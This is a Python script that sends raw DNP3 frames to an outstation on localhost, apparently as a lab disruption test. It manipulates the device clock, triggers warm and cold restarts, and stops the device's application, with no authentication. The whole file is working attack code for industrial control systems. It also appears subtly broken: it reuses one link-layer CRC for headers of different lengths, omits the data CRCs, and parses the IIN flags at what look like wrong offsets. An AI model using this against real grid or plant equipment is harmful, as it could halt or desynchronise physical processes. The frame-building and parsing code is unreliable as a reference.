import socket
import struct
import time
from rich.console import Console

console = Console()
HOST = "127.0.0.1"
PORT = 20000

def send_frame(frame, description):
    console.print(f"\n[bold yellow][*] Executing Test: {description}[/bold yellow]")
    console.print(f"[cyan][->] Sending {len(frame)} bytes:[/cyan] {frame.hex(' ')}")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3.0)
    try:
        sock.connect((HOST, PORT))
        sock.sendall(frame)
        response = sock.recv(1024)
        sock.close()
        
        console.print(f"[magenta][<-] Outstation Response ({len(response)} bytes):[/magenta] {response.hex(' ')}")
        decode_response(response)
    except Exception as e:
        console.print(f"[bold red][!] Connection/Send Error: {e}[/bold red]")

def decode_response(data):
    """
    Decodes DNP3 response header, IIN flags, and returns human-readable status.
    """
    if len(data) < 14:
        console.print("[red][!] Response too short to parse.[/red]")
        return

    iin1 = data[12]
    iin2 = data[13]

    # Check IIN1 flags
    time_sync = bool(iin1 & 0x10)
    func_not_supported = bool(iin2 & 0x01)
    param_error = bool(iin2 & 0x04)

    console.print(f"[bold white]    ├── IIN1.4 (Need Time): {time_sync}[/bold white]")
    if func_not_supported:
        console.print("[bold red]    └── Result: COMMAND REJECTED (Function Not Supported / App Stopped)[/bold red]")
    elif param_error:
        console.print("[bold red]    └── Result: COMMAND REJECTED (Parameter Out of Range)[/bold red]")
    else:
        console.print("[bold green]    └── Result: COMMAND EXECUTED SUCCESSFULLY (0x00)[/bold green]")

def build_write_time_frame(epoch_ms):
    """
    Builds a DNP3 Write Time (FC 0x18) frame with Object Group 50 Var 1 (6-byte timestamp).
    """
    # 48-bit timestamp in little endian
    time_bytes = epoch_ms.to_bytes(6, byteorder='little')
    payload = bytearray.fromhex("c1 c1 18 32 01 07 01") + time_bytes
    
    # Header: Sync (05 64), Length (17), Ctrl (44), Addrs (00 00 / 01 00), CRC (3b e3)
    frame = bytearray.fromhex("05 64 11 44 00 00 01 00 3b e3") + payload
    return bytes(frame)

def run_phase3_tests():
    console.print("[bold green]=== DNP3 Phase 3: State & System-Level Disruptions ===[/bold green]")

    # Test 1: Write Time (Set to arbitrary past epoch - Year 2020)
    # Epoch ms for Jan 1, 2020 00:00:00 UTC = 1577836800000
    past_timestamp = 1577836800000
    time_frame = build_write_time_frame(past_timestamp)
    send_frame(time_frame, "Write Time (FC 0x18) - Timestamp Manipulation (Year 2020)")

    # Test 2: Warm Restart (FC 0x0E)
    warm_restart_frame = bytes.fromhex("05 64 0b 44 00 00 01 00 3b e3 c1 c1 0e")
    send_frame(warm_restart_frame, "Warm Restart (FC 0x0E)")

    # Test 3: Stop Application (FC 0x12)
    stop_app_frame = bytes.fromhex("05 64 0b 44 00 00 01 00 3b e3 c1 c1 12")
    send_frame(stop_app_frame, "Stop Application (FC 0x12)")

    # Test 4: Follow-up Read post-Stop Application (Probing halted state)
    read_frame = bytes.fromhex("05 64 0b 44 00 00 01 00 3b e3 c1 c1 01")
    send_frame(read_frame, "Read Request (FC 0x01) on Stopped Application State")

    # Test 5: Cold Restart (FC 0x0D) - Restore application state
    cold_restart_frame = bytes.fromhex("05 64 0b 44 00 00 01 00 3b e3 c1 c1 0d")
    send_frame(cold_restart_frame, "Cold Restart (FC 0x0D) - System Reset")

if __name__ == "__main__":
    run_phase3_tests()